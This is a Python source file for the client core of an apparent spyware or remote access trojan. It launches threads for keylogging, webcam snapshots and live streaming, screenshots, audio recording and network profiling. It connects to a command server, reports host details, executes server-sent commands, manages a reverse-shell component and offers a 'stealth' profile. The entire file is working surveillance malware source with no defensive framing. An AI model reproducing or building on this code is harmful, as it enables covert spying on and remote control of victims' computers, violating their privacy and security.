from .__conf__.main import ClientAppConfig
from .features.keyLogger.main import KeyLogger
from .features.webcam_snapshot.main import Webcam
from .features.webcam_stream.main import WebcamStream
from .features.screenshot.main import Screenshot
from .features.networkInfo.main import NetworkInfo
from .features.socketClient.main import SocketClient
from .features.commandHandler.main import CommandHandler
from .utils.clientError.main import ClientError
import threading, time, datetime, platform, socket, sys

class ClientApp:
    """Client application class"""
    # How to return log message to main.py:
    # raise Exception({'message': 'Your log message here', 'level': 'info'})

    def __init__(self) -> None:
        '''Initialize client application'''
        
        # Initialize instances to None
        self.keylogger_instance = None
        self.webcam_snapshot_instance = None
        self.screenshot_instance = None
        self.network_instance = None
        self.webcam_stream_instance = None
        self.socket_client = None
        self.command_handler = None
        self.audio_instance = None
        self.audio_thread = None
        self.reverse_shell_instance = None
        
        try:
            self.initialise()
            self.__start__()
        except Exception as e: # Added error handling
            data = e.args[0] if e.args else None
            if isinstance(data, dict):
                raise Exception(data)
            else:
                raise ClientError("ClientApp Initialization Error - " + str(e), "critical")

    def initialise(self) -> None:
        '''Initial setup for client application'''
        try:
            self.config = ClientAppConfig()
            
            # Initialize command handler
            self.command_handler = CommandHandler(self)
            
            # Initialize feature threads
            self.keylogger_thread = threading.Thread(target=self._keylogger) if self.config.keylogger_enabled else None
            self.webcam_snapshot_thread = threading.Thread(target=self._webcam_snapshot) if self.config.webcam_snapshot_enabled else None
            self.webcam_stream_thread = threading.Thread(target=self._webcam_stream) if self.config.webcam_stream_enabled else None
            self.screenshot_thread = threading.Thread(target=self._screenshot) if self.config.screenshot_enabled else None
            self.network_thread = threading.Thread(target=self._network_info) if self.config.network_info_enabled else None
            self.audio_thread = threading.Thread(target=self._audio_recorder) if self.config.audio_enabled else None

            self.__init_socket_client__()
        except Exception as e:
            data = e.args[0] if e.args else None
            if isinstance(data, dict):
                raise Exception(data)
            else:
                raise ClientError("ClientApp Initialization Error - " + str(e), "critical")

    def __init_socket_client__(self) -> None:
        '''Initialize socket client'''
        try:
            self.socket_client = SocketClient(
                host=self.config.server_host,  
                port=self.config.server_port,  
                use_ssl=self.config.use_ssl,
                reconnect_delay=self.config.reconnect_delay
            )
            
            self.socket_client.set_callbacks(
                on_connect=self._on_socket_connect,
                on_disconnect=self._on_socket_disconnect,
                on_message=self._handle_server_message
            )
        except Exception as e:
            data = e.args[0] if e.args else None
            if isinstance(data, dict):
                raise Exception(data)
            else:
                raise ClientError("ClientApp Initialization Socket Error - " + str(e), "critical")

    def __start__(self):
        '''Start the client application'''

        try:
            # print("Starting socket client...")
            self.socket_client.start()
            # print("Socket client started")
            
            tasks = [
                self.keylogger_thread,
                self.webcam_snapshot_thread,
                self.webcam_stream_thread,
                self.screenshot_thread,
                self.network_thread,
                self.audio_thread
            ]
            
            # Start all enabled features
            for task in filter(None, tasks):
                task.daemon = True
                task.start()
            
            # print("Client application started")
            
            try:
                while True:
                    time.sleep(60)
            except KeyboardInterrupt:
                # print("\nShutting down...")
                self.__stop__()
        except Exception as e:
            data = e.args[0] if e.args else None
            if isinstance(data, dict):
                raise Exception(data)
            else:
                raise ClientError("ClientApp Start Error - " + str(e), "critical")

    def _on_socket_connect(self) -> None:
        """Callback when socket connects"""
        try:
            self.socket_client.send({
                'type': 'client_hello',
                'hostname': socket.gethostname(),
                'os': platform.system(),
                'features': {
                    'keylogger': self.config.keylogger_enabled,
                    'webcam': self.config.webcam_snapshot_enabled,
                    'screenshot': self.config.screenshot_enabled,
                    'network': self.config.network_info_enabled,
                    'webcam_stream': self.config.webcam_stream_enabled
                }
            })
        except Exception as e:
            raise ClientError("Socket Connect Error - " + str(e), "error")
    
    def _on_socket_disconnect(self) -> None:
        """Callback when socket disconnects"""
        pass
    
    def _handle_server_message(self, message: dict) -> None:
        """Handle messages from server"""
        # Uncomment the comments to enable client-side debugging (development only)
        try:
            msg_type = message.get('type', 'unknown')
            
            if msg_type == 'command':
                command = message.get('command')
                # print(f"Received command: {command}")
                
                kwargs = {k: v for k, v in message.items() if k not in ['type', 'command']}
                
                # print(f"[DEBUG] Calling handler for: {command}")
                # print(f"[DEBUG] Available handlers: {list(self.command_handler.handlers.keys())}")
                
                # Use command handler
                result = self.command_handler.handle(command, **kwargs)
                
                # print(f"[DEBUG] Handler result: {result}")
                
                # Send result back to server if applicable
                if result and result.get('type'):
                    # print(f"[DEBUG] Sending result with type: {result.get('type')}")
                    self.socket_client.send(result)
                else:
                    pass
                    # print(f"[DEBUG] No result to send")
            
            elif msg_type == 'ping':
                self.socket_client.send({
                    'type': 'pong',
                    'timestamp': datetime.datetime.now().isoformat()
                })
            
        except Exception as e:
            import traceback # retrieves the traceback as a string
            raise ClientError("Handle Server Message Error - " + str(e) + traceback.format_exc(), "error")

    def _send_frame_via_socket(self, frame_data):
        """Callback to send webcam frame via socket"""
        if self.socket_client and self.socket_client.is_connected():
            self.socket_client.send({
                'type': 'webcam_frame',
                'data': frame_data
            })

    def __stop__(self) -> None:
        '''Stop all features and socket'''
        
        try: 
            if self.socket_client:
                self.socket_client.stop()
            
            if hasattr(self, 'keylogger_instance') and self.keylogger_instance:
                try:
                    self.keylogger_instance.stop()
                except Exception as e:
                    raise e

            if hasattr(self, 'audio_instance') and self.audio_instance:
                try:
                    self.audio_instance.stop()
                except Exception as e:
                    raise e

            if hasattr(self, 'webcam_snapshot_instance') and self.webcam_snapshot_instance:
                try:
                    self.webcam_snapshot_instance.stop()
                except Exception as e:
                    raise e
            
            if hasattr(self, 'screenshot_instance') and self.screenshot_instance:
                try:
                    self.screenshot_instance.stop()
                except Exception as e:
                    raise e
            
            if hasattr(self, 'network_instance') and self.network_instance:
                try:
                    self.network_instance.stop()
                except Exception as e:
                    raise e
            
            if hasattr(self, 'webcam_stream_instance') and self.webcam_stream_instance:
                try:
                    self.webcam_stream_instance.stop()
                except Exception as e:
                    raise e
            if hasattr(self, 'reverse_shell_instance') and self.reverse_shell_instance:
                try:
                    self.reverse_shell_instance.stop()
                except Exception as e:
                    raise e
        except Exception as e:
            raise ClientError("ClientApp Stop Error - " + str(e), "error")

    def _network_info(self) -> None:
        '''Monitor network configuration'''

        try:
            self.network_instance = NetworkInfo(
                output_file="logs/network_info.json",
                interval=self.config.network_info_interval,
                track_changes=self.config.network_info_track_changes
            )
            self.network_instance.start()
            while True:
                time.sleep(1)
        except Exception as e:
            raise ClientError("ClientApp Network Info Error - " + str(e), "critical")

    def _screenshot(self) -> None:
        '''Capture screenshots'''

        try:
            self.screenshot_instance = Screenshot(
                output_dir="logs/screenshots",
                interval=self.config.screenshot_interval,  
                change_detection=self.config.screenshot_change_detection,
                quality=self.config.screenshot_quality 
            )
            self.screenshot_instance.start()
            while True:
                time.sleep(1)
        except Exception as e:
            raise ClientError("ClientApp Screenshot Error - " + str(e), "critical")

    def _audio_recorder(self) -> None:
        '''Audio recorder thread function'''

        try:
            try:
                from .features.audioRecorder.main import AudioRecorder
                
                self.audio_instance = AudioRecorder(
                    output_dir="logs/audio",
                    duration=self.config.audio_duration
                )
                self.audio_instance.start(
                    continuous=True,
                    interval=self.config.audio_interval
                )
                
                while True:
                    time.sleep(1)
            
            except Exception as e:
                pass
                # print(f"Audio recorder error: {e}") # For debugging
        except Exception as e:
            raise ClientError("ClientApp Audio Recorder Error - " + str(e), "critical")
            
    def _keylogger(self) -> None:
        '''Keylogger thread function'''
        try:
            self.keylogger_instance = KeyLogger(
                log_file="logs/keylog.json",
                inactivity_timeout=self.config.keylogger_interval
            )
            self.keylogger_instance.start()
        except Exception as e:
            raise ClientError("ClientApp Keylogger Error - " + str(e), "critical")

    def _webcam_snapshot(self) -> None:
        '''Capture webcam snapshots'''
        try:
            self.webcam_snapshot_instance = Webcam(
                output_dir="logs/snapshots",
                interval=self.config.webcam_interval,
                camera_index=0,
                motion_detection=self.config.webcam_movement_enabled
            )
            self.webcam_snapshot_instance.start()
            while True:
                time.sleep(1)
        except Exception as e:
            raise ClientError("ClientApp Webcam Snapshot Error - " + str(e), "critical")

    def _webcam_stream(self) -> None:
        '''Stream webcam to server via socket'''

        try:
            self.webcam_stream_instance = WebcamStream(
                camera_index=0,
                fps=self.config.webcam_stream_fps,  
                resolution=self.config.webcam_stream_resolution,  
                quality=self.config.webcam_stream_quality,  
                motion_only=self.config.webcam_stream_motion_only  
            )
            self.webcam_stream_instance.start(
                frame_callback=self._send_frame_via_socket
            )
            while True:
                time.sleep(1)
        except Exception as e:
            raise ClientError("ClientApp Webcam Stream Error - " + str(e), "critical")

    def get_config(self) -> dict:
        """
        Get all configurable parameters
        Returns:
            dict: Configuration dictionary
        """
        
        try:
            return {
                'keylogger_interval': self.config.keylogger_interval,
                'webcam_interval': self.config.webcam_interval,
                'webcam_stream_fps': self.config.webcam_stream_fps,
                'webcam_stream_resolution': self.config.webcam_stream_resolution,
                'webcam_stream_quality': self.config.webcam_stream_quality,
                'screenshot_interval': self.config.screenshot_interval,
                'screenshot_quality': self.config.screenshot_quality,
                'network_info_interval': self.config.network_info_interval,
                'audio_duration': self.config.audio_duration,
                'audio_interval': self.config.audio_interval,
                
                # Features status
                'features': {
                    'keylogger': self.config.keylogger_enabled,
                    'webcam_snapshot': self.config.webcam_snapshot_enabled,
                    'webcam_stream': self.config.webcam_stream_enabled,
                    'screenshot': self.config.screenshot_enabled,
                    'network_info': self.config.network_info_enabled,
                    'audio': self.config.audio_enabled
                }
            }
        except Exception as e:
            raise ClientError("Get Config Error - " + str(e), "error")
    
    def set_config(self, param, value) -> bool:
        """
        Set a configuration parameter
        Args:
            param: Parameter name
            value: New value
        Returns:
            bool: True if successful
        """
        
        try:
            try:
                # Validate and convert value
                if param in ['keylogger_interval', 'webcam_interval', 'screenshot_interval', 
                            'network_info_interval', 'audio_duration', 'audio_interval',
                            'webcam_stream_fps', 'webcam_stream_quality', 'screenshot_quality']:
                    value = int(value)
                
                elif param == 'webcam_stream_resolution':
                    # Parse resolution like "640x480" or "(640, 480)"
                    if isinstance(value, str):
                        if 'x' in value:
                            width, height = value.split('x')
                            value = (int(width), int(height))
                        else:
                            value = tuple(map(int, value.strip('()').split(',')))
                
                # Set the value
                if hasattr(self, param):
                    setattr(self, param, value)
                    return True
                else:
                    return False
            
            except Exception as e:
                return False
        except Exception as e:
            raise ClientError("Set Config Error - " + str(e), "error")
    
    def load_profile(self, profile_name) -> bool:
        """
        Load a predefined configuration profile
        Args:
            profile_name: Name of the profile
        Returns:
            bool: True if successful
        """

        try:
            profiles = {
                'stealth': {
                    'keylogger_interval': 10,
                    'webcam_interval': 300,
                    'screenshot_interval': 300,
                    'webcam_stream_fps': 5,
                    'webcam_stream_quality': 40,
                    'screenshot_quality': 60,
                    'network_info_interval': 600,
                    'audio_duration': 5,
                    'audio_interval': 300
                },
                'performance': {
                    'keylogger_interval': 2,
                    'webcam_interval': 10,
                    'screenshot_interval': 20,
                    'webcam_stream_fps': 30,
                    'webcam_stream_quality': 90,
                    'screenshot_quality': 95,
                    'network_info_interval': 60,
                    'audio_duration': 30,
                    'audio_interval': 30
                },
                'balanced': {
                    'keylogger_interval': 5,
                    'webcam_interval': 30,
                    'screenshot_interval': 60,
                    'webcam_stream_fps': 10,
                    'webcam_stream_quality': 60,
                    'screenshot_quality': 85,
                    'network_info_interval': 300,
                    'audio_duration': 10,
                    'audio_interval': 60
                },
                'minimal': {
                    'keylogger_interval': 30,
                    'webcam_interval': 600,
                    'screenshot_interval': 600,
                    'webcam_stream_fps': 3,
                    'webcam_stream_quality': 30,
                    'screenshot_quality': 50,
                    'network_info_interval': 1800,
                    'audio_duration': 5,
                    'audio_interval': 600
                }
            }
            
            if profile_name in profiles:
                profile = profiles[profile_name]
                for param, value in profile.items():
                    setattr(self, param, value)
                return True
            
            return False
        except Exception as e:
            raise ClientError("Load Profile Error - " + str(e), "error")
        
if __name__ == "__main__":
    app = ClientApp()